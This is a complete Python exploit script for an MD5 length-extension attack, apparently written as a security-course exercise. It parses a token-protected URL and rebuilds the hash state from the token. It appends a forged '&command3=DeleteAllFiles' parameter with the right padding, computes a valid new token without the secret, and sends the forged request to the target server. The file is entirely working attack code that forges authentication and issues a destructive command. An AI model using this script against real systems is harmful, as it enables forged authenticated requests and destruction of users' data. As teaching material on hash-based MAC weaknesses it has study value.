from pymd5 import md5, padding
import urllib.parse
import sys
import http.client

if len(sys.argv) !=2:
    print('Requires the URL to extend as a command line argument.')
    exit(1)

original_url = urllib.parse.urlparse(sys.argv[1])
site=original_url.scheme + '://' + original_url.netloc + original_url.path + '?'+ '{}'
original_token=original_url.query.split('=',2)[1].split('&',1)[0]
original_query=original_url.query.split('=',1)[1].split('&',1)[1]
malicousExt = b'&command3=DeleteAllFiles'

OgMessageLength = len(original_query) + 8 #original query plus 8-char password
messagePad= padding(OgMessageLength * 8)
totelMessageLen = (OgMessageLength + len(messagePad)) *8

#now we can recreate state of has function when it left off originially
h=md5(state=bytes.fromhex(original_token), count=totelMessageLen)
h.update(malicousExt)
updatedToken = h.hexdigest()
malicousExt='&command3=DeleteAllFiles'
urlSafePad=urllib.parse.quote(messagePad)

updateQuery = 'token={}&{}{}{}'.format(updatedToken,original_query,urlSafePad,malicousExt)

new_url= site.format(updateQuery)
parsed_url = urllib.parse.urlparse(new_url)
conn = http.client.HTTPSConnection(parsed_url.hostname,
parsed_url.port)
conn.request("GET", parsed_url.path + "?" + parsed_url.query)
print(conn.getresponse().read())
